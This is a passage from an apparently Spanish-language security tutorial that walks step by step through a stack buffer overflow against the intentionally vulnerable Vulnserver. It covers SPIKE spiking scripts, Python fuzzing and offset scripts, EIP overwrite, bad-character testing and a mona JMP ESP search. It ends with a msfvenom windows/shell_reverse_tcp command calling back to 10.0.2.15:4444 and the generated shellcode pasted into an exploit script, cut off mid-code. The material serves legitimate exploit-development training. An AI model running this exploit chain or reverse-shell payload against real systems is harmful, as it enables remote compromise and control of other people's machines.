<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019101258.png" text-align="center" />
</div>

<p>Esto tiene un alto riesgo debido a que el EIP le dice al procesador qué instrucción ejecutar a continuación y su sobreescritura, es decir, el cambio de contenido de este puntero, puede conducir, como hemos dicho antes, a que el procesador ejecute una instrucción potencialmente maliciosa de un atacante, como un shellcode.</p>

<p><br /></p>

<h4 id="23-pasos-para-realizar-un-buffer-overflow">2.3. Pasos para realizar un Buffer Overflow.</h4>

<p><strong>Overall</strong></p>

<p>Los pasos que un atacante da para encontrar y realizar satisfactoriamente un Buffer Overflows son los siguientes:</p>

<ul>
  <li><em>Spiking</em>: Metodo para encontrar una parte vulnerable del código.</li>
  <li><em>Fuzzing</em>: Metodo para testear si la parte potencialmente vulnerable es de hecho ‘breakable’.</li>
  <li><em>Finding the Offset</em>: Encontramos el punto concreto de ruptura.</li>
  <li><em>Overwriting the EIP</em>: A través del offset concreto introducimos la cantidad de datos necesarios para sobreescribir el EIP.</li>
  <li><em>Cleanup job</em>: Una vez hemos alterado el EIP hay que realizar trabajkos de limpieza como Finding Bad Characters, Finding the Right Module.</li>
  <li><em>Generating the ShellCode</em>: Generamos el código malicioso y hacemos que el EIP apunte sobre el shellcode para generar un reverseshell.</li>
</ul>

<p><br /></p>

<h5 id="231-spiking">2.3.1. Spiking.</h5>

<p><strong>Asentando el material</strong></p>

<p>En primer lugar, en nuestra máquina virtual de Windows 10 desactivamos Windows Defender y ejecutamos Vulnserver e Immunity Debugger con permisos de administrador.</p>

<p>Seguidamente en Immunity Debugger enlazamos Vulnserver:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019130441.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019130533.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019130650.png" text-align="center" />
</div>

<p>Observamos que abajo a la derecha aparece un recuadro amarillo que dice ‘Paused’, le damos al botón de play en la parte superior del programa y debería de cambiar a running:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019130737.png" text-align="center" />
</div>

<p>Una vez que tenemos el servicio corriendo, este será accesible desde el exterior tal y como se puede ver con Netcat en el puerto 9999 de la máquina víctima:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019131523.png" text-align="center" />
</div>

<p><br /></p>

<p><strong>Spiking</strong></p>

<p>Ahora, veámos cómo podemos saber si este servicio es vulnerable. Este servicio admite la introducción de una serie de comandos que se ejecutan como binarios, programas que se procesan en memoria como hemos comentado antes. Vamos a testear si alguno de los comandos se procesan de manera inadecuada a través del ‘spiking’.</p>

<p>La premisa consiste en que si envíamos contenidos de datos muy grandes y conseguimos desbordar el BufferSpace lograremos que el programa ‘crashee’ de lo contrario seguirá como si no estuviera pasando nada.</p>

<p>Vamos a utilizar una herramienta llamada <a href="https://resources.infosecinstitute.com/topic/intro-to-fuzzing">generic_send_tcp</a> esta es una herramienta de SPIKE scripting, concretamente es un intérprete de .spk scripts escritos en C para enviar datos a servicios de red.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019165607.png" text-align="center" />
</div>

<p>Podemos ver en la imágen que necesitamos pasar un host, un puerto, un script SPK que contiene las acciones que el intérpreta va a realizar para terminar enviándo una iteración de datos al host indicado.</p>

<p>Así, en primer lugar, utilizamos el siguiente script para spikear el comando STATS:</p>

<pre><code class="language-spk">s_readline();
s_string("STATS ");
s_string_variable("0");
</code></pre>

<p>En el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./generic_send_tcp &lt;HOST&gt; 9999 stats.spk 0 0
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019173540.png" text-align="center" />
</div>

<p>Este comando a utilizado la herramienta generic_send_tcp para enviar al puerto 9999 del host establecido y primero a leido el mensaje de entrada</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019173710.png" text-align="center" />
</div>

<p>Y seguidamente a envíado el string “STATS 0” con cada vez más datos, primero 10, luego 100, luego 1000, luego 2000 con la finalidad de comprobar si el servicio crashea.</p>

<p>Por otra parte, como el comando STATS está (intencionalmente), bien gestionado, nada ha ocurrido, en Immunity Debugger se puede ver que todas las peticiones se han procesado correctamente</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019173858.png" text-align="center" />
</div>

<p>Y en la CMD desde la que hemos iniciado Vulnserver.exe se puede comprobar que todo ha ido con normalidad:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019173940.png" text-align="center" />
</div>

<p>Con lo que, transcurrido un tiempo razonable en el que no ocurre nada destacable dejamos de spikear el comando y pasamos al siguiente.</p>

<p>Ahora, acudimos a uno que sabemos que es intencionalmente vulnerable para observar la diferencia. De nuevo, utilizamos el siguiente script:</p>

<pre><code class="language-spk">s_readline();
s_string("TRUN ");
s_string_variable("0");
</code></pre>

<p>En el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./generic_send_tcp &lt;HOST&gt; 9999 trun.spk 0 0
</code></pre></div></div>

<p>De nuevo, lo que hacemos es leer la primera línea del servicio y seguidamente enviar “TRUN 0” con cada vez más caracteres a la espera de comprobar si ocurre algún fallo.</p>

<p>Eventualmente, observamos que:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019174523.png" text-align="center" />
</div>

<p>El intérprete nos comunica que la primera línea que el servicio comunica al conectarse es que no se ha podido establecer una conexión, esto es un indicio de que probablemente, el servicio a crasheado y el comando es vulnerable.</p>

<p>De vuelta a Immunity Debugger observamos que ha habido una ruptura abrupta de las instrucciones que se procesan y los registros muestran una sobreescritura:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019175149.png" text-align="center" />
</div>

<p>Recordamos que ‘41’ es el caracter ‘A’ en hexadecimal, de forma que el EIP se ha sobreescrito y el puntero ya no apunta a una instrucción real (recordamos que el EIP apunta a la siguiente instrucción que el CPU debe procesar) y por ende el servicio crashea.</p>

<p>A su vez, la terminal que poseía el ejecutable Vulnserver.exe ha cerrado:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221019175332.png" text-align="center" />
</div>

<p>Luego, efectivamente, el servicio a crasheado y el BufferSpace se ha desbordado derivando en una sobreescritura del resto de elementos del stack en el comando TRUN.</p>

<p><br /></p>

<h4 id="24-fuzzing">2.4. Fuzzing.</h4>

<p>Una vez hemos descubierto un comando vulnerable que podemos hacer crashear con el “Spiking” vamos a averiguar la cantidad exacta de bytes que necesitamos para desbordar el buffer y hacer crashear el programa con el “Fuzzing”.</p>

<p>Esta técnica es relativamente similar al spiking; consiste en enviar progresivamente grandes cantidades de datos hasta hacer creashear el servicio. Sin embargo, en lugar de hacerlo entre comandos lo hacemos con uno que ya sabemos que es vulnerable y variamos entre cantidades más pequeñas para obtener una información más precisa de cuántos datos hacen falta para desbordar el comando que sabemos que es vulnerable.</p>

<p>En lugar de utilizar una herramienta prehecha vamos a emplear el siguiente script escrito en Python:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">100</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'&lt;WinIP&gt;'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>

<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">((</span><span class="s">'TRUN /.:/'</span><span class="o">+</span> <span class="nb">buffer</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="nb">buffer</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">100</span>

<span class="k">except</span><span class="p">:</span>
<span class="k">print</span> <span class="s">"Fuzzing crasehd at %s bytes"</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="nb">buffer</span><span class="p">))</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>

<p>Este último abre en bucle abre una conexión con el servicio y le envía un string para que procese el comando TRUN junto con una cantidad de datos que se incrementa con el paso de los bucles. En el momento en el que el servicio crashea se captura una excepción que nos devuelve los bytes que contenía el buffer en el momento de crashear.</p>

<p>Así, lanzamos el script, estamos pendientes del Immunity Debugger y en el momento en el que crashea recogemos la excepción:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221021123517.png" text-align="center" />
</div>

<p>De esta forma, los bytes que se necesitan para desbordar el Buffer Space rondan alrrededor de los 2000 bytes.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221021124504.png" text-align="center" />
</div>

<p><br /></p>

<h4 id="25-finding-the-offset">2.5. Finding the offset.</h4>

<p>Ahora que sabemos aproximadamente cuándo crashea, vamos a utilizar una herramienta del entorno de Metasploit para capturar exactamente el número de bytes que sobreescriben el EIP ya que este es el registro cuyo contenido nos interesa controlar.</p>

<p>En primer lugar empleamos el comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class="nt">-l</span> &lt;crashedbytes&gt;
</code></pre></div></div>

<p>Donde en lugar de &lt;crashedbytes&gt; escribimos los bytes en los que aproximadamente crashea el servicio:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221021132419.png" text-align="center" />
</div>

<p>Esto nos da un patrón que mide 3000 bytes, lo lanzaremos contra el servicio seguros de que va a crashear y luego observaremos con Immunity Debugger el segmento del patrón que ha sobreescrito el EIP obtiendo así el offset concreto en el que se comienza a sobreescribir el registro.</p>

<p>De esta forma, utilizamos el siguiente código Python:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span>

<span class="n">offset</span><span class="o">=</span><span class="s">"&lt;pattern&gt;"</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'&lt;WinIP&gt;'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">((</span><span class="s">'TRUN /.:/'</span> <span class="o">+</span> <span class="n">offset</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">except</span><span class="p">:</span>
<span class="k">print</span> <span class="s">"Error connecting to server"</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>

<p>Para lanzar una sola vez el data sobre el servicio en el comando vulnerable.
Al lanzarlo, obtenemos el crasheo y vemos en Immunity Debugger que el EIP se ha sobreescrito con el valor “386F4337”.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221021132533.png" text-align="center" />
</div>

<p>De esta manera, introducimos los datos en el siguiente comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb <span class="nt">-l</span> 3000 <span class="nt">-q</span> 386F4337
</code></pre></div></div>

<p>Y obtenemos que el offset concreto está en el byte 2003:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221021132842.png" text-align="center" />
</div>

<p>Esto significa que cuesta 2003 bytes llegar hasta el valor que sobreescribirá el registro EIP.</p>

<p><br /></p>

<h4 id="26-overriding-the-eip">2.6. Overriding the EIP.</h4>

<p>Ahora, sabemos que cuesta 2003 bytes llegar al comienzo del EIP y además sabemos que el EIP tiene 4 bytes de largo. De esta forma, ahora loque queda es sobreescribir estos bytes.</p>

<p>Para demostrar esta tesis vamos a reutilizar el código python que hemos escrito en la sección anterior y vamos a reescribirlo de forma que quede como sigue:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span>

<span class="n">offset</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">2003</span> <span class="o">+</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">4</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'&lt;WinIP&gt;'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">((</span><span class="s">'TRUN /.:/'</span> <span class="o">+</span> <span class="n">offset</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">except</span><span class="p">:</span>
<span class="k">print</span> <span class="s">"Error connecting to server"</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>

<p>El objetivo se vuelve evidente. Si estamos en lo cierto, después de utilizar este código podremos observar que el valor del registro EIP consta de cuatro Bs. Y efectivamente:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024082925.png" text-align="center" />
</div>

<p>Podemos observar que el registro ha cambiado por cuatro “42” (B en hexadecimal).</p>

<p><br /></p>

<h4 id="27-finding-bad-characters">2.7. Finding bad characters.</h4>

<p>La forma de sacar ventaja de este hallazgo pasa por generar un código malicioso denominado “shell code” que será ejecutado una vez tomemos control del EIP y lo utilizemos para indicar al procesador que la próxima instrucción que debe ejecutar involucra al malware.</p>

<p>Antes de llegar a desarrollar este código maliciosos existe un paso previo que tiene que ver con encontrar unos caracteres específicos “bad characters”. Estos no son más que caracteres indeseados que pueden provocar un mal funcionamiento del shellcode debido al uso que el procesador hace de ellos en el procesamiento del programa debido al uso que de ellos hace el mismo.</p>

<p>Para identificar ‘badcharacteres’ empleamos la siguiente técnica en la que utilizamos la siguiente <a href="https://github.com/cytopia/badchars">herramienta</a> para generar caracteres en distintos lenguajes de programación.</p>

<p>En primer lugar, reunimos todos los caracteres hexadecimales posibles y los enviamos justo después de la instrucción que sobreescribe el EIP:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span>

<span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span>
<span class="s">"</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"</span>
<span class="p">)</span>

<span class="n">offset</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">2003</span> <span class="o">+</span> <span class="s">"B"</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">badchars</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'&lt;WinIP&gt;'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">((</span><span class="s">'TRUN /.:/'</span> <span class="o">+</span> <span class="n">offset</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">except</span><span class="p">:</span>
<span class="k">print</span> <span class="s">"Error connecting to server"</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>

<p>Observemos que este código introduce el código referente al badchars después de la sobreescritura del EIP, esto se hace porque queremos ver cómo se va a procesar el código de shellcode que vamos a introducircque irá después del valor del EIP en el exploit.</p>

<p>Seguidamente, estos caracteres pueden ser observados en el “hexdump” del registro ESP (Stack Pointer):</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024085926.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024090008.png" text-align="center" />
</div>

<p>Ahí encontramos los caracteres enviados en la lista anterior. En este caso, vulnserver es un servidor muy simple y no tenemos badcharacteres pero, en el caso de tenerlos, lo sabríamos porque en el hexdump el lugar del caracter ponzoñoso tendríamos algo que no tiene sentido en lo que debería de ser una lista ordenada de números hexadecimales, por ejemplo:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024090249.png" text-align="center" />
</div>

<p>Ahí podemos observar que muchos caracteres están sustituidos por una expresión que no cuadra aunque esta es siempre la misma no tiene por qué ser siempre así, insistimos en que sencillamente es algo que no cuadra.</p>

<p>Una vez identificados deberemos descartarlos de cara a generar el payload.</p>

<p><br /></p>

<h4 id="28-finding-the-right-module">2.8. Finding the Right Module.</h4>

<p>En esta sección debemos buscar el módulo correcto, esto es una DLL que no tenga protecciones de memoria con la finalidad de conseguir que el procesador salte a una instrucción que le haga procesar esta DLL en la que habremos incluido nuestra shell code maliciosa.</p>

<p>En primer lugar, empleamos el <a href="https://github.com/corelan/mona">mona</a> que se trata de una herramienta que se puede utilizar de manera conjunta con Immunity Debugger. Lo descargamos y lo ponemos en la carpeta: “C:&gt;Program Files (x86)&gt;Immunity Inc&gt;Immunity Debugger&gt;PyCommands”:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024113515.png" text-align="center" />
</div>

<p>Seguidamente tecleamos “!mona modules” en la barra de comandos del programa y pulsamos Enter:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024114558.png" text-align="center" />
</div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024114624.png" text-align="center" />
</div>

<p>Podemos ver que el sistema ofrece una lista de módulos y las opciones de seguridad que tiene cada uno, nos interesa un módulo asociado al servicio Vulnserver que tenga todo en falso:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024114835.png" text-align="center" />
</div>

<p>Este módulo es el “essfunc.dll”. El objetivo es sustituir este módulo poruno malicioso y hacer que el programa lo procese. Para ello l que hacemos es colocar en el registro EIP el valor de la dirección de memoria de este módulo, con lo que necesitamos encontrar la dirección en la que este módulo se encuentra para colocarla como valor del registro EIP.</p>

<p>Para ello empleamos el comando: “!mona find -s “\xff\xe4 -m essfunc.dll”, este comando nos llevará al puntero que necesitamos:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024115527.png" text-align="center" />
</div>

<p>Tenemos una lista de punteros, seleccionamos uno (625011af) y lo incluímos en nuestro código de Python:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span>

<span class="n">offset</span><span class="o">=</span><span class="s">"A"</span><span class="o">*</span><span class="mi">2003</span> <span class="o">+</span> <span class="s">"</span><span class="se">\xaf\x11\x50\x62</span><span class="s">"</span>

<span class="k">try</span><span class="p">:</span>
<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'&lt;WinIP&gt;'</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">((</span><span class="s">'TRUN /.:/'</span> <span class="o">+</span> <span class="n">offset</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">except</span><span class="p">:</span>
<span class="k">print</span> <span class="s">"Error connecting to server"</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
</code></pre></div></div>

<p>Notemos que los bytes están con el prefijo hexadecimal y los bytes están colocados al revés, estos es por cuestiones relativas a la arquitectura x86.</p>

<p>Así, al lanzar el programa obtenemos:</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024123100.png" text-align="center" />
</div>

<p>El EIP ha quedado sobreescrito con la dirección de memoria que le lleva al registro.</p>

<p><br /></p>

<h4 id="29-generating-shellcode-and-exploiting">2.9. Generating Shellcode and Exploiting.</h4>

<p>Ahora todo lo que queda es generar la shellcode con Msfvenom:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.0.2.15 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> c <span class="nt">-a</span> x86 <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span>
</code></pre></div></div>

<p>Observemos por otra parte que la opción ‘-b’ nos permite desechar los badcharacters, pero como no hemos encontrado ninguno sólo añadimos el 00.</p>

<div style="text-align:center">
	<img src="/assets/img/THM/Pasted%20image%2020221024130858.png" text-align="center" />
</div>

<p>Copiamos y pegamos el resultado en el siguiente código python:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span><span class="p">,</span> <span class="n">socket</span>

<span class="n">overflow</span> <span class="o">=</span><span class="p">(</span>
<span class="s">"</span><span class="se">\xbb\x6e\x1f\xfc\x39\xdd\xc6\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x52\x83\xc7\x04\x31\x5f\x0e\x03\x31\x11\x1e\xcc\x31\xc5\x5c</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x2f\xc9\x16\x01\xb9\x2c\x27\x01\xdd\x25\x18\xb1\x95\x6b\x95</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x3a\xfb\x9f\x2e\x4e\xd4\x90\x87\xe5\x02\x9f\x18\x55\x76\xbe</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x9a\xa4\xab\x60\xa2\x66\xbe\x61\xe3\x9b\x33\x33\xbc\xd0\xe6</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xa3\xc9\xad\x3a\x48\x81\x20\x3b\xad\x52\x42\x6a\x60\xe8\x1d</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xac\x83\x3d\x16\xe5\x9b\x22\x13\xbf\x10\x90\xef\x3e\xf0\xe8</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x10\xec\x3d\xc5\xe2\xec\x7a\xe2\x1c\x9b\x72\x10\xa0\x9c\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6a\x7e\x28\x51\xcc\xf5\x8a\xbd\xec\xda\x4d\x36\xe2\x97\x1a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x10\xe7\x26\xce\x2b\x13\xa2\xf1\xfb\x95\xf0\xd5\xdf\xfe\xa3</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x74\x46\x5b\x05\x88\x98\x04\xfa\x2c\xd3\xa9\xef\x5c\xbe\xa5</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xdc\x6c\x40\x36\x4b\xe6\x33\x04\xd4\x5c\xdb\x24\x9d\x7a\x1c</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x4a\xb4\x3b\xb2\xb5\x37\x3c\x9b\x71\x63\x6c\xb3\x50\x0c\xe7</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x43\x5c\xd9\xa8\x13\xf2\xb2\x08\xc3\xb2\x62\xe1\x09\x3d\x5c</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x11\x32\x97\xf5\xb8\xc9\x70\xf0\x3c\xd3\x8f\x6c\x3f\xd3\x9e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x30\xb6\x35\xca\xd8\x9e\xee\x63\x40\xbb\x64\x15\x8d\x11\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x15\x05\x96\xf6\xd8\xee\xd3\xe4\x8d\x1e\xae\x56\x1b\x20\x04</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xfe\xc7\xb3\xc3\xfe\x8e\xaf\x5b\xa9\xc7\x1e\x92\x3f\xfa\x39</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x0c\x5d\x07\xdf\x77\xe5\xdc\x1c\x79\xe4\x91\x19\x5d\xf6\x6f</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xa1\xd9\xa2\x3f\xf4\xb7\x1c\x86\xae\x79\xf6\x50\x1c\xd0\x9e</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x25\x6e\xe3\xd8\x29\xbb\x95\x04\x9b\x12\xe0\x3b\x14\xf3\xe4</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x44\x48\x63\x0a\x9f\xc8\x83\xe9\x35\x25\x2c\xb4\xdc\x84\x31</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x0b\xca\x4f\xc4\xb9\xb3\xab\xd4\xc8\xb6\xf0\x52\x21\xcb</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x69\x37\x45\x78\x89\x12</span><span class="s">"</span><span class="p">)</span>

